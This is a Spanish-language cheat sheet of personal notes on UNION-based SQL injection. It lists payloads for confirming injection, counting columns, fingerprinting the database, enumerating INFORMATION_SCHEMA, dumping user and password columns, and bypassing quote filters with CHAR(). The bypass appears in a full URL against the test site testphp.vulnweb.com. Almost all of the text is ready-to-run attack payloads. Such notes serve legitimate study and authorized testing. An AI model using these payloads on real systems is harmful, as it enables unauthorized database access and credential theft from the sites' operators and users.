SQLi UNION  

1. COMPROBACION SI ES VULNERABLE ("AND" SI LA QUERY SABEMOS QUE ES VALIDA (POR EJ CONSULTA SQL ID EN URL), 
				  "OR" SI ES INVALIDA(POR EJ INICIO SESION EN PAGINA WEB) :
	
	-1 AND 1=1 
	-1 AND 1=0 
	
	-1' AND '1'='1 (O 1' AND '1'='1' -- -)
	-1' AND '1'='0

	-1" AND "1"="1
	-1" AND "1"="0 

SI ES VULNERABLE, LA PAGINA DEBERIA DE QUEDARSE IGUAL (CON EL 1=1) Y CAMBIAR CON LA QUERY NEGADA (1=0) 
YA QUE HARIA FALSA TODA LA CONSULTA SQL. 
SI ES VULNERABLE, SERA IGUAL CON TODAS (INTEGER, ', ") MENOS CON UNA (LA NEGADA CON EL FORMATO CORRECTO)

SI QUERY VALIDA, UTILIZAMOS "AND" Y NEGAMOS CONSULTA (1=0) PARA AÑADIR NUESTRA PROPIA CONSULTA CON UNION
SI QUERY INVALIDA, UTILIZAMOS "OR" Y CONVERTIMOS EN TRUE LA CONSULTA (1=1) 

2. VER NUMERO DE COLUMNAS Y SI SE PRINTEAN ESTOS DATOS
	
	- AND 1=0 UNION SELECT 1,2, ... ETC
	- ' AND '1'='0' UNION SELECT 1,2, ... ETC -- -
	- " AND "1"="0" UNION SELECT 1,2, ... ETC -- -

VER QUE NUMEROS SE REPRESENTAN/PRINTEAN EN LA PAG PARA VER DONDE SALEN LOS DATOS AÑADIDOS Y PEDIDOS DE LA CONSULTA 


3. SACAR INFORMACION BASICA DE LA PAGINA UTILIZANDO LA REPRESENTACION GRAFICA SACADA CON LOS NUMEROS DEL SELECT

	- AND 1=0 UNION SELECT 1,XXX, ... ETC
	- ' AND '1'='0' UNION SELECT 1,XXX, ... ETC -- -
	- " AND "1"="0" UNION SELECT 1,XXX, ... ETC -- -

XXX = USER() -> USUARIO DESDE DONDE SE ESTAN LLEVANDO A CABO LAS CONSULTAS
      DATABASE() -> LA BASE DE DATOS LA CUAL SE ESTAN EJECUTANDO LAS CONSULTAS
      @@DATADIR -> DIRECTORIO DONDE ESTA INSTALADA LA BASE DE DATOS
      @@VERSION -> CUAL ES LA VERSION

4. CUALES SON LAS BD Q TIENE LA APLICACION, CUALES NOS INTERESAN, CUALES SON LAS TABLAS QUE NOS INTERESA DE LA BD,  
   CUALES SON LAS COLUMNAS QUE NOS INTERESAN DE LA BD PARA PODER VOLCAR LOS DATOS

	-AND 1=0 UNION SELECT 1,SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA  (INFO TODAS LAS BASES DE DATOS QUE HAY)
	
	
	(A VECES NO APARECE TODO, PROBAR CON GROUP_CONCAT(SCHEMA_NAME (o lo q sea) ) FROM ....

INFORMATION_SCHEMA->
(DENTRO DE AQUI HAY UNA TABLA CON INFO/DETALLES ESPECIFICA DE TODAS LAS BD QUE HAY, HAY OTRA TABLA QUE TIENE INFO 
DE TODAS LAS TABLAS QUE HAY, HAY OTRA TABLA QUE TIENE INFO DE TODAS LAS COLUMNAS QUE HAY)
	
	-AND 1=0 UNION SELECT 1,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES (INFO TODAS LAS TABLAS DE TODAS LAS BD)
	-->AND 1=0 UNION SELECT 1,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='XXX' (TABLAS DE 
	UNA BD EN ESPECIFICO)
	
	-AND 1=0 UNION SELECT 1,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='XXX'(INFO TODAS 
	LAS COLUMNAS DE UNA TABLA ESPECIFICA)



5. HACER QUERIES A NUESTRO GUSTO UTILIZANDO LA INFO OBTENIDA

	-AND 1=0 UNION SELECT [COLUMNAS] FROM [TABLA] (WHERE [CONDICION])
	EJ: ' AND '1'='0' UNION SELECT USER,PASSWORD FROM USERS -- -
		AND 1=0 UNION SELECT 1,2,GROUP_CONCAT(UNAME, PASS) FROM USERS
		and 1=0 union select 1,group_concat(uname), group_concat(pass) FROM users


POSSIBLE FILTERS
(CUANDO NO PODEMOS PONER "" EN EL TABLE NAME)
http://testphp.vulnweb.com/artists.php?artist=1%20and%201=0%20union%20select%201,2,group_concat(column_name)%20FROM%20INFORMATION_SCHEMA.columns%20WHERE%20table_name=CHAR(117,115,101,114,115)
	
(GROUP CONCAT PARA AGRUPAR RESULTADOS EN UNA UNICA SALIDA)